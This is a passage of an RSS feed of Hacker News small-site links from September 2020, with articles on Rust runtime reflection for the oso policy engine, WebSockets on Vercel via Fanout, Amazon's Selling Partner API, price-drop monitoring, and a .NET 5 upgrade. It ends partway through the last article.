<p>It‚Äôs frequently convenient to conflate booleans with bits, their minimal representation, but in truth they‚Äôre not the same at all. Practically, some programming languages define booleans as a byte in memory, perhaps clamping its values to 0 and 1; others define them as instances of some boolean class, or constructors of an algebraic datatype. Some provide no formal relationship between <code>true</code> and <code>false</code> at all, save for a common interface‚Äîduck typing.</p>
<p>Mathematically, booleans are the values in propositional logic; the upper and lower bounds of a lattice; the zero and one of a semiring; the members of the set with cardinality 2; ‚Ä¶</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/">https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/</a></em></p>]]>
            </description>
            <link>https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580312</guid>
            <pubDate>Thu, 24 Sep 2020 16:26:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a runtime reflection system for Rust (Part 1)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580273">thread link</a>) | @samjs
<br/>
September 24, 2020 | https://www.osohq.com/post/rust-reflection-pt-1 | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/rust-reflection-pt-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>Part 1: <code>dyn Class</code></h2>
<h3>Introduction</h3>
<p>We're building oso, an open source policy engine for authorization. You can use oso to separate authorization logic from application code by writing policies in our declarative language, called Polar. oso is built to be <em>embedded</em> directly in the application, which means you can pass in application objects, check types, lookup attributes, and call methods. To do this, it relies on each host language's support for runtime reflection.</p>
<p>This is trivial for languages like Python, for instance, where getting the type from an object is as simple as <code>type(obj)</code>, and accessing arbitrary attributes and methods is just <code>getattr(obj, "attr")</code>. We first shipped oso with support for Python, Ruby and Java, followed by JavaScript.</p>
<p>When we set out to build support for oso in Rust applications, we had to solve this problem ourselves because Rust doesn't have any out-of-the box support for runtime reflection. It does, however, have some low-level building blocks that we can assemble to create something similar.</p>
<p>This is the first part of a three-part series in which we describe how we implemented a runtime reflection system in Rust for oso.</p>
<p>In this post, we look at how dynamic type checks work in Rust, and explain how our team built a simple class system that we use as the foundation for the rest of the reflection system and the rest of the series.</p>
<h3>Introduction to <code>std::any::Any</code></h3>
<p>The main way to achieve dynamic dispatch in Rust is through the trait system. And the <a href="https://doc.rust-lang.org/book/ch17-03-oo-design-patterns.html#summary">Rust book has this quote</a> for us in design patterns:</p>
<blockquote>
<p>No matter whether or not you think Rust is an object-oriented language after reading this chapter, you now know that you can use trait objects to get some object-oriented features in Rust. Dynamic dispatch can give your code some flexibility in exchange for a bit of runtime performance</p>
</blockquote>
<p>In some ways, the Mother of all Traits is <a href="https://doc.rust-lang.org/std/any/trait.Any.html"><em>std::any::Any</em></a>, which the documentation describes as "A trait to emulate dynamic typing."</p>
<p>This lets us erase a thing's concrete type, and pass around its "trait object" instead:</p>
<pre><code>let s: String = "Hello, World".to_string();
let any: Box&lt;dyn Any&gt; = Box::new(s);

// `any` doesn't have a type, running:
//    println!("{}", any);
// would fail with:
//     error[E0277]: `dyn std::any::Any` doesn't implement `std::fmt::Display`

let mut recovered: Box&lt;String&gt; = any.downcast().expect("failed conversion");
recovered.make_ascii_uppercase();
println!("{}", recovered);
</code></pre>

<p>In case you're interested: profiling the bottom code takes 18ns versus approx. 16ns for the version without downcasting. You can see in the assembly there's some 20-30 instructions needed for the conversion: <a href="https://godbolt.org/z/Ph6q3b">https://godbolt.org/z/Ph6q3b</a>.</p>
<p>A few layers beneath the surface of the <code>Any</code> trait, and what makes the above possible, is <a href="https://doc.rust-lang.org/std/any/struct.TypeId.html#method.of"><code>TypeId::of::&lt;T&gt;</code></a>. This method uses a compiler intrinsic to inspect the object's type. The important part is that the original object still has a concrete type, even though that type has temporarily been "lost" to the current scope.</p>
<p>With this one small piece of intrinsic Rust, we begin to build our fully dynamic system.</p>
<h2>What is oso?</h2>
<p>As mentioned at the beginning, oso is a policy engine for authorization. It reads in policies ‚Äì written in the Polar language ‚Äì and makes authorization decisions by evaluating the rules against the provided inputs. Polar is a variant of Prolog, and encodes logic as rules. The syntax looks like this:</p>
<pre><code># True for all inputs that are of type Foo
is_a_foo(input: Foo);

# True if the x attribute of the input is equal to 1
x_is_one(input) if input.x = 1;
</code></pre>

<p>The important parts are (a) <code>input: Foo</code> which checks that the input parameter is of type <code>Foo</code>, and where <code>Foo</code> is a type defined in the application; and (b) <code>input.x</code> which is a lookup on <code>input</code> of the attribute <code>x</code> , even if <code>input</code> is an application object. These are the types of use cases that our dynamic system needs to support.</p>
<h3>Implementing <code>Class</code> and <code>Instance</code></h3>
<p>We lay the foundation of our runtime reflection system by wrapping types up in classes, and wrapping objects as instances. Starting with just the pieces we've seen so far, the initial implementations for these look like this:</p>
<pre><code>/// Class definition
struct Class {
   /// The name of the class
   name: String,
   /// The corresponding Rust type
   type_id: TypeId,
}

impl Class {
    /// Create a new class definition for the type `T`
    fn new&lt;T&gt;() -&gt; Self {
        Self {
            name: std::any::type_name::&lt;T&gt;(),
            type_id: TypeId::of::&lt;T&gt;(),
        }
    }
}

/// An instance of a class
struct Instance {
    inner: Arc&lt;dyn Any&gt;, // `Arc` because we don't need/want mutability
}

impl Instance {
    /// Construct a new `Instance` from a type that
    /// implements `Any` (i.e. any sized type).
    fn new(obj: impl Any) -&gt; Self {
        Self {
            inner: Arc::new(obj)
        }
    }
}
</code></pre>

<p>With just this in place, we have our simple runtime class system!</p>
<h3>Dynamic type checking</h3>
<p>As shown in the brief snippet of Polar earlier, we want to be able to type-check using the syntax <code>input: Foo</code>. This translates into our class system as: "is <code>input</code> an instance of the <code>Foo</code> class"?</p>
<p>We could track what type the object had when we created it by storing the <code>TypeId</code>, but it's actually even simpler to recover the <code>TypeId</code> of the inner object stored on our <code>Instance</code> using the <code>Any::type_id</code> trait method:</p>
<pre><code>impl Instance {
    /// Check whether this is an instance of the provided class
    fn instance_of(&amp;self, class: &amp;Class) -&gt; bool {
        self.inner.as_ref().type_id() == class.type_id
    }
}
</code></pre>

<p>Not bad!</p>
<p>Note one important detail: when writing this example I initially wrote <code>self.inner.type_id() == class.type_id</code> . This <a href="https://play.rust-lang.org/?version=nightly&amp;mode=debug&amp;edition=2018&amp;gist=51ca79b94b834e0696cd619b7c51634c">is not the same thing</a> as the code above, because <code>Arc&lt;dyn Any&gt;</code> <em>also</em> implements <code>std::any::Any</code>, and thus has a type ID. To avoid making these kinds of mistakes, we've found that the best practice is to restrict the number of places directly accessing the <code>dyn Any</code> object to as few as possible, providing helper functions for even the simplest of methods.</p>
<p>To test that this is working:</p>
<pre><code>#[test]
fn test_instance_of() {
    struct Foo {}
    struct Bar {}

    let foo_class: Class = Class::new::&lt;Foo&gt;();
    let bar_class: Class = Class::new::&lt;Bar&gt;();
    let foo_instance: Instance = Instance::new(Foo {});

    assert!(foo_instance.instance_of(&amp;foo_class));
    assert!(!foo_instance.instance_of(&amp;bar_class));
}
</code></pre>

<p>And there we have it ‚Äì&nbsp;we were able to successfully determine <strong>at runtime</strong> the class of the <code>Instance</code>!</p>
<h3>Future extension: traits as interfaces</h3>
<p>Now that we have our class system up and running, what else can we do with it? One pattern used in oso policies is using inheritance to write rules over multiple objects. For example, we might model "vets can treat all pets," as <code>can_treat("vet", pet: Pet)</code>, but "only doctors can treat a human" as <code>can_treat("doctor", human: Human)</code>.</p>
<p>Rust doesn't <em>really</em> have any notion of subtypes (except for lifetimes, which are out of scope for this post) but it does have traits. And traits are like interfaces. So perhaps we should be able to use traits again in some way?</p>
<p>Revisiting the docs for <code>std::any::Any</code> we find:</p>
<blockquote>
<p>Note that &amp;dyn Any is limited to testing whether a value is of a specified concrete type, and cannot be used to test whether a type implements a trait.</p>
</blockquote>
<p>Well, then.</p>
<p>Not all hope is lost, there are some interesting approaches out there to do <em>just what we need</em>. The most prominent approach I could find is <a href="https://github.com/Diggsey/query_interface"><code>query_interface</code></a>. Or <a href="http://idubrov.name/rust/2018/06/16/dynamic-casting-traits.html">this blog post</a> on dynamic casting for traits.</p>
<p>Digging into how <code>query_interface</code> works: there's a fair amount of unsafety and casting pointers and vtable manipulation. All fun stuff, but the disappointing part (for us) is that the "check whether a type implements a trait" is really handled at compile-time by the macro. There are lines like:</p>
<pre><code>let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
</code></pre>

<p>Which will error at compile-time if <code>Foo</code> doesn't implement <code>MyTrait</code>:</p>
<pre><code>138 |     let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^ the trait `MyTrait` is not implemented for `Foo`
</code></pre>

<p>It's doing the wildly unsafe casting-trait-objects-to-other-trait-objects-at-runtime, but the checks are all done at compile-time. And the trait bounds are explicitly "registered" through use of the macro: <code>interfaces!(Foo: dyn MyTrait)</code>.</p>
<p>Given that we're not <em>yet</em> interested in using trait implementations, rather just checking whether a type implements a trait or not, this approach doesn't help us get any closer to making our runtime reflection system support traits as interfaces.</p>
<p>If instead we scope the task to registering trait implementations as part of a macro, we can get there with something more straightforward:</p>
<pre><code>trait HasInterface {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool;
}

impl HasInterface for Foo {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool
    {
        // compile-time assertions
        static_assertions::assert_impl_all!(Foo: MyTrait);

        // runtime check
        match std::any::TypeId::of::&lt;T&gt;() {
            x if x == std::any::TypeId::of::&lt;dyn MyTrait&gt;() =&gt; true,
              // ... etc
              _ =&gt; false,
        }
    }
}
</code></pre>

<p>The above code is safe, and can easily be automated through a macro. However, it does have the same limitation as <code>query_interface</code> ‚Äì&nbsp;the traits need to be <a href="https://doc.rust-lang.org/1.26.2/book/second-edition/ch17-02-trait-objects.html#object-safety-is-required-for-trait-objects"><em>object safe</em></a>.</p>
<h3>Conclusion</h3>
<p>We've built the foundation of our runtime reflection system through classes and instances, and we've shown some simple dynamic type checking using the built in <code>Any</code> trait.</p>
<p>Up next, things start getting a bit more complicated as we attempt to replicate Python's <code>getattr</code> magic method, and make it possible to look up <em>attributes</em> on Rust structs dynamically at runtime.</p>
<ul>
<li>Subscribe to our newsletter below to get the next installment of this
  series.</li>
<li>Interested in learning more about oso? Check out our
  <a href="https://docs.osohq.com/">docs</a>.</li>
<li>If you have any feedback, or want to chat about Rust, come join us in
  <a href="https://join-slack.osohq.com/">Slack</a>.</li>
</ul></div></div></div>]]>
            </description>
            <link>https://www.osohq.com/post/rust-reflection-pt-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580273</guid>
            <pubDate>Thu, 24 Sep 2020 16:23:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vercel and WebSockets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580260">thread link</a>) | @jkarneges
<br/>
September 24, 2020 | https://blog.fanout.io/2020/09/21/vercel-and-websockets/ | <a href="https://web.archive.org/web/*/https://blog.fanout.io/2020/09/21/vercel-and-websockets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  <!-- Embellishments -->
  
  

  

  <!-- Page content -->
  <section>
    <article>
      <p><a href="https://vercel.com/">Vercel</a> makes it easy to deploy and scale HTTP APIs using <a href="https://vercel.com/docs/serverless-functions/introduction">Serverless Functions</a>. However, it‚Äôs not possible to use serverless functions to host WebSocket APIs. Does this mean you need to give up on your hopes and dreams and set up normal servers to handle your WebSockets? No way! Vercel can be combined with <a href="https://fanout.io/cloud/">Fanout Cloud</a> to handle WebSocket connections without having to literally host them.</p>

<p><img src="https://blog.fanout.io/assets/fanout-vercel.png" alt="fanout-vercel"></p>

<p>By using Vercel and Fanout Cloud together, API logic can be kept in one place. Fanout Cloud can manage the WebSocket connections, and invoke functions whenever there is client activity. What‚Äôs great about this approach is there‚Äôs nothing extra to deploy, and it works at high scale too.</p>

<!--more-->

<h3 id="example">Example</h3>

<p>Below is some code for a simple WebSocket chat API. Messages received from clients are broadcasted to all other connected clients. It uses the <a href="https://github.com/fanout/js-serve-grip">serve-grip</a> library, which provides a pseudo-WebSocket connection object. ‚ÄúGRIP‚Äù is the name of the integration protocol Fanout uses with the backend server.</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>ServeGrip</span> <span>}</span> <span>=</span> <span>require</span><span>(</span> <span>'</span><span>@fanoutio/serve-grip</span><span>'</span> <span>);</span>
<span>const</span> <span>{</span> <span>WebSocketMessageFormat</span> <span>}</span> <span>=</span> <span>require</span><span>(</span> <span>'</span><span>@fanoutio/grip</span><span>'</span> <span>);</span>

<span>const</span> <span>serveGrip</span> <span>=</span> <span>new</span> <span>ServeGrip</span><span>({</span><span>grip</span><span>:</span> <span>process</span><span>.</span><span>env</span><span>.</span><span>GRIP_URL</span><span>});</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>async</span> <span>(</span><span>req</span><span>,</span> <span>res</span><span>)</span> <span>=&gt;</span> <span>{</span>

    <span>await</span> <span>serveGrip</span><span>.</span><span>run</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>);</span>

    <span>const</span> <span>{</span> <span>wsContext</span> <span>}</span> <span>=</span> <span>req</span><span>.</span><span>grip</span><span>;</span>
    <span>if</span> <span>(</span><span>wsContext</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
        <span>res</span><span>.</span><span>statusCode</span> <span>=</span> <span>400</span><span>;</span>
        <span>res</span><span>.</span><span>end</span><span>(</span><span>'</span><span>Not a WebSocket-over-HTTP request</span><span>\n</span><span>'</span><span>);</span>
        <span>return</span><span>;</span>
    <span>}</span>

    <span>// if this is a new connection, accept it and subscribe it to a channel</span>
    <span>if</span> <span>(</span><span>wsContext</span><span>.</span><span>isOpening</span><span>())</span> <span>{</span>
        <span>wsContext</span><span>.</span><span>accept</span><span>();</span>
        <span>wsContext</span><span>.</span><span>subscribe</span><span>(</span><span>'</span><span>all</span><span>'</span><span>);</span>
    <span>}</span>

    <span>while</span> <span>(</span><span>wsContext</span><span>.</span><span>canRecv</span><span>())</span> <span>{</span>
        <span>const</span> <span>message</span> <span>=</span> <span>wsContext</span><span>.</span><span>recv</span><span>();</span>

        <span>if</span> <span>(</span><span>message</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
            <span>// if return value is undefined then connection is closed</span>
            <span>wsContext</span><span>.</span><span>close</span><span>();</span>
            <span>break</span><span>;</span>
        <span>}</span>

        <span>// broadcast to other connections</span>
        <span>const</span> <span>publisher</span> <span>=</span> <span>serveGrip</span><span>.</span><span>getPublisher</span><span>();</span>
        <span>await</span> <span>publisher</span><span>.</span><span>publishFormats</span><span>(</span>
            <span>'</span><span>all</span><span>'</span><span>,</span>
            <span>new</span> <span>WebSocketMessageFormat</span><span>(</span><span>message</span><span>)</span>
        <span>);</span>
    <span>}</span>

    <span>res</span><span>.</span><span>end</span><span>();</span>
<span>};</span>
</code></pre></div></div>

<p>For demonstration purposes, the above code has been deployed and set up as follows:</p>

<ul>
  <li>The code has been deployed to Vercel with base URL <code>https://vercel-websocket.vercel.app</code>.</li>
  <li>The Fanout domain <code>bce4b2a0.fanoutcdn.com</code> has been set up with <code>vercel-websocket.vercel.app:443</code> as its origin server.</li>
  <li>The <code>GRIP_URL</code> environment variable has been set on the Vercel app, containing Fanout credentials.</li>
</ul>

<p>It is possible to connect with a WebSocket client and send a message:</p>

<div><div><pre><code>$ wscat -c wss://bce4b2a0.fanoutcdn.com/api/chat
connected (press CTRL+C to quit)
&gt; hi
&lt; hi
</code></pre></div></div>

<h3 id="how-it-works">How it works</h3>

<p>Fanout Cloud acts as a proxy between clients and an origin server, with some important abilities:</p>

<ul>
  <li>WebSocket client traffic is converted into a series of HTTP requests sent to the origin server. This makes it possible for a plain HTTP backend to react to WebSocket traffic.</li>
  <li>The origin server can associate publish-subscribe channels with client connections, and then publish raw WebSocket messages to be injected into those client connections.</li>
</ul>

<p>The <a href="https://github.com/fanout/js-serve-grip">serve-grip</a> library provides a socket-like object called <code>WebSocketContext</code> that handles the event marshalling over HTTP. The object contains methods like <code>accept()</code>, <code>send()</code>, <code>recv()</code>, etc. What‚Äôs interesting is that these methods don‚Äôt operate directly on a real WebSocket. When <code>recv()</code> is called, it simply iterates over the events received in the current HTTP request. When <code>send()</code> is called, events are temporarily enqueued and a middleware serializes them at the end into the HTTP response. <code>WebSocketContext</code> objects are not long-lived, and a fresh one is created for each handler invocation and destroyed afterwards.</p>

<p>The library also provides ways to subscribe connections to channels as well as to publish to channels. Notably, clients have no awareness of GRIP or channels. They just connect to WebSocket URLs and exchange arbitrary messages, the meaning of which is determined by your application.</p>

<p>For protocol details, see <a href="https://pushpin.org/docs/protocols/grip/">Generic Realtime Intermediary Protocol</a> and <a href="https://pushpin.org/docs/protocols/websocket-over-http/">WebSocket-over-HTTP</a>.</p>

<h3 id="serverless-websockets-today">Serverless WebSockets, today</h3>

<p>Sign up for a free <a href="https://fanout.io/cloud/">Fanout Cloud</a> account and get a WebSocket API up and running in no time.</p>


    </article>

    <!-- <p class="subtome">
      <span class="subtome-description">Liked this post? Follow this blog to get more.</span>&nbsp;<input type="button" onclick="(function(){var z=document.createElement('script');z.src='https://www.subtome.com/load.js';document.body.appendChild(z);})()" value="Follow" />
    </p> -->

  </section>

  <section>
    <h2>Recent posts</h2>

    
    <h2>
      <a href="https://blog.fanout.io/">View all posts</a>
    </h2>
  </section>


</div>

<!-- <div class="post">

  <header class="post-header">
    <h1 class="post-title">Vercel and WebSockets</h1>
    <p class="post-meta">Sep 21, 2020 ‚Ä¢ justin</p>
  </header>

  <article class="post-content">
  </article>

</div> -->

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.fanout.io/2020/09/21/vercel-and-websockets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580260</guid>
            <pubDate>Thu, 24 Sep 2020 16:23:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Successor to Amazon MWS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580022">thread link</a>) | @jlevers
<br/>
September 24, 2020 | https://jesseevers.com/new-amazon-seller-api/ | <a href="https://web.archive.org/web/*/https://jesseevers.com/new-amazon-seller-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
        </header>
      

      <section itemprop="text">
        
        <p>‚Ä¶well, sort of. In a few days, Amazon is releasing a new marketplace API that sellers can use to programmatically control their seller accounts. It‚Äôs called the Selling Partner API, or SP for short. SP is a major upgrade from MWS‚Äîlet‚Äôs look at how the two services are different, and why you should care.</p>
<p>For 10+ years, <a href="http://docs.developer.amazonservices.com/en_US/dev_guide/index.html">Amazon's Marketplace Web Services</a> (MWS) has been the only option for interfacing with Amazon seller accounts programatically. You can control everything about your Amazon store via MWS, from managing inventory to receiving order information to handling fulfillment. It‚Äôs a powerful tool, because it enables sellers to handle larger inventories and order volume, automatically modify prices to stay competitive, and do other common (and not so common) operations in bulk.</p>
<p>MWS has some warts, though. It‚Äôs an XML-based API, a design that largely fell by the wayside as JSON-based APIs became increasingly popular in the last decade.<sup><a id="fnr.1" href="#fn.1">1</a></sup> XML imposes more mandatory structure on each API request than JSON does, leading to extra layers of abstraction on top of HTTP. It also has static, non-adjustable rate limits, and error handling is cumbersome‚Äîwhen you send a data file to MWS, you have to wait for it to finish processing, and then pull down another file that maps errors to specific lines in the file you uploaded.</p>
<p>SP solves all these problems, and more! Some of my favorite features:</p>
<ul>
  <li><b>A RESTful interface, operated via standard HTTP methods.</b> All MWS requests are done via POST, and the actual operation performed is dictated by the content of the request. In contrast, SP requests use the GET, POST, or PUT methods, all of which cause the action related to the verb.<sup><a id="fnr.2" href="#fn.2">2</a></sup></li>
  <li><b><a href="https://github.com/amzn/selling-partner-api-docs/blob/main/guides/usage-plans-rate-limits/Usage-Plans-and-Rate-Limits.md">Dynamic usage plans.</a></b> Now you can increase rate limits as your business grows, so you don‚Äôt have to pick and choose which API operations to perform to stay below a static limit.</li>
  <li><b>Better handling for authentication and permissions.</b> You can specify granular permissions, and API tokens are available via AWS IAM<sup><a id="fnr.3" href="#fn.3">3</a></sup> rather than a complex registration process.</li>
  <li><b>A sandboxed version of the API.</b> MWS doesn‚Äôt have one of these, so you have to test your code on production data. It‚Äôs a nerve wracking experience‚ÄïI will definitely admit to having messed up data as a result of this.</li>
</ul>
<p>If you‚Äôre a seller or developer with an MWS application, don‚Äôt panic! Amazon isn‚Äôt planning to immediately deprecate MWS. You can incrementally transition your application from MWS to SP, since there will be support for <a href="https://github.com/amzn/selling-partner-api-docs/blob/main/guides/developer-guide/SellingPartnerApiDeveloperGuide.md#creating-a-hybrid-selling-partner-api-application">hybrid Selling Partner applications</a> that use both MWS and SP at the same time. That said, Amazon does say that ‚Äúthe legacy Amazon MWS APIs will be deprecated in the future,‚Äù so I recommend getting ahead of the issue.</p>
<p>Amazon has released Java and C# clients for the Selling Partner API. MWS has Java, C#, and PHP clients, so I would not be surprised to see a PHP client for SP sometime soon. The Java and C# clients use <a href="https://swagger.io/tools/swagger-codegen/">Swagger code generation</a> (with <a href="https://github.com/amzn/selling-partner-api-models">these endpoint models</a>), so it should be relatively straightforward to implement SP clients in any other language that Swagger can target.</p>
<p>Once Amazon releases v1 of the Selling Partner API, I‚Äôll post an article that guides you through making your first SP application. Stay tuned by signing up for my newsletter below! And as always, please email me if you have any questions. I‚Äôd love to hear from you.</p>


<p>(Also, I help Amazon sellers increase their sales via MWS‚Äïif you‚Äôre interested in upgrading your selling infrastructure, shoot me a line at <a href="mailto:jesse@jesseevers.com">jesse@jesseevers.com</a>.)</p>
<hr>

<p><sup><a id="fn.1" href="#fnr.1">1</a></sup> I originally wrote:</p>
<blockquote>
  <p>MWS is an XML-RPC API, a design that largely fell by the wayside as RESTful APIs became increasingly popular in the last decade.</p>
</blockquote>
<p>After doing more research on the true definitions of XML-RPC and RESTful APIs, I found that comparing the two creates a false dichotomy, since XML-RPC is a protocol and RESTful implies a certain set of constraints (but does not specify any implementation).</p>
<p><sup><a id="fn.2" href="#fnr.2">2</a></sup> For a refresher on the actions indicated by each HTTP verb, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">check out MDN</a>.</p>
<p><sup><a id="fn.3" href="#fnr.3">3</a></sup> IAM, or Identity and Access Management, is AWS‚Äôs service for managing roles and permissions for Amazon services. Lots more information <a href="https://aws.amazon.com/iam/">here</a>.</p>

        
      </section>

      

      

      
  

    </div></div>]]>
            </description>
            <link>https://jesseevers.com/new-amazon-seller-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580022</guid>
            <pubDate>Thu, 24 Sep 2020 16:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pulling up on the death spiral of price drops]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579987">thread link</a>) | @iamwil
<br/>
September 24, 2020 | https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/ | <a href="https://web.archive.org/web/*/https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://automationcookbook.io/content/images/size/w300/2020/09/pexels-tirachard-kumtanom-733857.jpg 300w,
                            https://automationcookbook.io/content/images/size/w600/2020/09/pexels-tirachard-kumtanom-733857.jpg 600w,
                            https://automationcookbook.io/content/images/size/w1000/2020/09/pexels-tirachard-kumtanom-733857.jpg 1000w,
                            https://automationcookbook.io/content/images/size/w2000/2020/09/pexels-tirachard-kumtanom-733857.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://automationcookbook.io/content/images/size/w2000/2020/09/pexels-tirachard-kumtanom-733857.jpg" alt="Pulling up on the death spiral of price drops">
            </figure>

            <section>
                <div>
                    <p><em>Running a business has many moving parts. The more you can automate, the more it frees you up to address high level strategic challenges of your business. This is a newsletter about automating aspects of your business.</em></p><h3 id="story-and-problem">Story and Problem</h3><p>When I was working at Pebble, a smartwatch maker, we had a couple different channels to sell through: our own eCommerce shop, physical retailers, and Amazon. When you work with a large distributor, and you're a smaller product company, they naturally want to de-risk their investment in selling your product on their site.</p><p>One of the ways Amazon de-risk is to stipulate that if there is a lower price somewhere on the web, they will automatically lower the price of your product listing on their site within X hours of discovering the lower price.</p><p>This is normally not a big deal, because our sales team would sell for the same price across different channels.</p><p>This is where online fraud steps into the picture. Fraudsters would be <a href="https://automationcookbook.io/yet-one-more-thing-you-can-do-to-thwart-fraudsters/">dropshipping Pebbles on eBay and purchase Pebbles on our eCommerce shop with stolen credit cards</a>. In order to attract buyers on eBay, they would purposely list the price of a Pebble 10-20% lower than the retail price we had on Amazon. This would set up automatic price adjustments at Amazon, if it wasn't rectified within a certain amount of time. This can spiral out of control if not monitored, especially if other channels selling your product caught wind of the price drop and threaten to lower the prices of your product on their site.</p><p>For a while, we relied on just someone noticing manually. But eventually, we built a rudimentary webscraper to detect price drops on eBay, and notify us on Slack if that was the case. Then we would take action with our counterparts at eBay to look into delisting the repeat offenders.</p><h3 id="automation">Automation</h3><p>Nowadays, it's much easier to do this sort of thing. You can use a visual webscraper like <a href="https://www.parsehub.com/">Parsehub</a>, <a href="https://www.diffbot.com/">Diffbot</a>,to scrape eBay search listing for Pebble prices. Then, using any workflow manager with integrations with a webscraper, like <a href="https://zapier.com/">Zapier</a>, you can easily route the results of the webscraping to <a href="https://airtable.com/">Airtable</a> or Google Sheets to track it over time. And from Airtable, you can find all listings lower than the price scraped from the Pebble eCommerce site. If there are any listing that fit the criteria, send a notification to Slack.</p><ul><li><a href="https://alternativeto.net/software/diffbot/">Diffbot alternatives</a></li><li><a href="https://alternativeto.net/software/zapier/">Zapier alternatives</a></li><li><a href="https://alternativeto.net/software/airtable/">Airtable alternatives</a></li></ul><!--kg-card-begin: html--><!--kg-card-end: html--><ul><li><a href="mailto:iamwil@gmail.com?subject=Requesting%20Integromat%20Howto%20for%20'add%20friction%20to%20your%20signups'">[1] Pebble is the now-defunct smartwatch maker. They were acquired by </a><a href="https://fitbit.com/">Fitbit</a> later on.</li></ul><p>Photo by <strong><a href="https://www.pexels.com/@tirachard-kumtanom-112571?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Tirachard Kumtanom</a></strong> from <strong><a href="https://www.pexels.com/photo/white-blank-notebook-733857/?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Pexels</a></strong></p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Automation Cookbook</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://automationcookbook.io/pulling-up-on-the-death-spiral-of-price-drops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579987</guid>
            <pubDate>Thu, 24 Sep 2020 16:03:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Upgrading a production app to .NET 5.0 RC-1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579969">thread link</a>) | @jhunter1016
<br/>
September 24, 2020 | https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/ | <a href="https://web.archive.org/web/*/https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
<p>For anyone who has built an application, you‚Äôve probably built it on some library or framework that changes over time. To keep up, you have to upgrade your application. However, there are varying schools of thought around when you should upgrade. At&nbsp;<a href="https://exceptionless/">Exceptionless</a>, we like to be on the bleeding edge. As an open-source company, we feel a responsibility to the community to know and understand the open-source tools we use. As such, we have already upgraded Exceptionless to use .NET 5.0.</p>



<p>To give you a little background, .NET 5.0 was&nbsp;<a href="https://devblogs.microsoft.com/dotnet/introducing-net-5/">introduced in May of 2019</a>. The announcement was a big one as Microsoft chose to drop the .NET Core distinction. Going forward, we will just see cross-platform support in the form of ‚Äú.NET X.X‚Äù. The first release candidate for .NET 5.0 was&nbsp;<a href="https://devblogs.microsoft.com/dotnet/announcing-net-5-0-rc-1/">announced September 13, 2020</a>. We chose to upgrade and begin using .NET 5.0 immediately. That decision was driven by Microsoft‚Äôs commitment to supporting production usage of the rc1 release. And as it turned out, the upgrade process was not too painful at all.</p>



<p>All in, the upgrade took about one hour and was a very small commit. You can actually&nbsp;<a href="https://github.com/exceptionless/Exceptionless/commit/874f08e70a3ded2762f8d34df0378de38d7a3193">see the commit here</a>. This is really a testament to the foundation we‚Äôve built here combined with the long-running foundation Microsoft has built with the .NET framework. Exceptionless is no small application and yet we were able to upgrade to an early release candidate in order to capitalize on new capabilities. To highlight the scale of Exceptionless and the relatively minor impact the upgrade process had, let‚Äôs take a look at some of our numbers.</p>



<ul><li>1.4 TB Elasticsearch Cluster</li><li>173M Elasticsearch Documents</li><li>384M Redis Operations/Day</li><li>122M HTTP Requests/Day</li><li>2,476 GitHub Stars</li><li>568 GitHub Forks</li></ul>



